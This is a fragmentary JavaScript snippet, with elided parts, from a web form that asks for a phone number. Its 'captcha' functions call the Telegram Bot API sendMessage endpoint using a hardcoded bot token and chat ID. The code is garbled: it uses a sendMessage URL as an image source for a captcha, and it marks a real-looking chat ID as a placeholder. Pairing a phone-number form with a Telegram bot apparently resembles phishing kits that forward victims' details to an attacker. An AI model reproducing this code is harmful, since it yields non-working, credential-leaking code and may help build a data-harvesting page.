...
function generateCaptcha() {
  return sendRequest('GET', 'https://api.telegram.org/bot6809652653:AAHWREMEkP9vYrGgpffAoEq71zSRiP-5KXk/sendMessage', new URLSearchParams({
    ...
    chat_id: '6939935510' // Replace with your chat ID
  })).then(responseText => {
...
function displayCaptcha(messageId, inlineMessageId) {
  captchaContainer.innerHTML = 
    `<img src="https://api.telegram.org/bot6809652653:AAHWREMEkP9vYrGgpffAoEq71zSRiP-5KXk/sendMessage?parse_mode=Markdown&chat_id=6939935510&text=*Captcha:*&message_id=${messageId}&inline_message_id=${inlineMessageId}" alt="Captcha">`
  ;
}
...
form.addEventListener('submit', event => {
  ...
  if (!phoneNumberInput.value.startsWith('+')) {
    errorMessage.textContent = 'Please enter the phone number in the following format: +1234567890';
    return;
  }
